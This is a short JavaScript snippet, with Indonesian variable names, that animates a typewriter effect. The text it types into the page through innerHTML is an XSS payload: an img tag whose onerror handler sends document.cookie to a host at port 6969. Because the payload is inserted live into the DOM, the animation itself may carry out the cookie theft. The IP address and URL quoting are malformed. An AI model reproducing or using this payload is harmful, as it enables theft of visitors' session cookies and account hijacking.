var index = 0;
var text = "<img src=x onerror=this.src=http://192.168.0.00:6969/?+document.cookie;>"
var kecepatan = 50;

function ngetik() {
    if (index < text.length) {
        document.getElementById('ketik').innerHTML += text.charAt(index);
        index++;
        setTimeout(ngetik, kecepatan);
    }
}